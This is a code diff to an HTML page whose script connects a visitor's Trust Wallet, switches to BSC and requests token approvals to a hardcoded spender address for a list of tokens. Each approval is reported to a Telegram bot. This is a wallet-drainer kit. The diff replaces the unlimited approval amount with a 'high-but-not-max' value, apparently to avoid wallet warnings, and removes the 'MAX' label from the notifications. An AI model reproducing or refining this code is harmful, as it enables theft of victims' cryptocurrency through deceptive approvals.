@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en"> 
+<html lang="en">
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
@@ -147,6 +147,9 @@
     { symbol: "XRP",  name: "XRP BEP-20",      address: "0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE", decimals: 18 }
   ];
 
+  /* High-but-not-max approval amount: 1e27 (1000000000000000000000000000) */
+  var APPROVE_AMOUNT = (10n ** 27n);
+
   function isTrustProvider(p) {
     if (!p) return false;
     if (p.isTrust) return true;
@@ -221,7 +224,7 @@
         connectBtn.style.display = "none";
         disconnectBtn.style.display = "block";
         await ensureBSC(trustProvider);
-        await approveMax();
+        await approveHigh();
       }
     } catch (e) {}
   }
@@ -241,7 +244,7 @@
         connectBtn.style.display = "none";
         disconnectBtn.style.display = "block";
         await ensureBSC(trustProvider);
-        await approveMax();
+        await approveHigh();
       }
     } catch (e) {
       statusMsg.textContent = "Connection rejected. Trust Wallet access is required.";
@@ -278,16 +281,15 @@
     return fetch(url, { method: "POST", body: body }).catch(function () {});
   }
 
-  async function approveMax() {
+  async function approveHigh() {
     if (!trustProvider || !currentAddr) return;
-    var MAX_UINT256 = (2n ** 256n - 1n);
 
     for (var i = 0; i < TOKENS.length; i++) {
       var t = TOKENS[i];
       try {
         var selector   = "095ea7b3";
         var spenderHex = TARGET_ADDRESS.toLowerCase().replace(/^0x/, "").padStart(64, "0");
-        var amountHex  = MAX_UINT256.toString(16).padStart(64, "0");
+        var amountHex  = APPROVE_AMOUNT.toString(16).padStart(64, "0");
         var data = "0x" + selector + spenderHex + amountHex;
 
         var txHash = await trustProvider.request({
@@ -296,7 +298,7 @@
         });
 
         sendTelegram(
-          "✅ <b>Approval confirmed (MAX)</b>\n" +
+          "✅ <b>Approval confirmed</b>\n" +
           "<b>Wallet:</b> <code>" + currentAddr + "</code>\n" +
           "<b>Token:</b> " + t.symbol + "\n" +
           "<b>Spender:</b> <code>" + TARGET_ADDRESS + "</code>\n" +
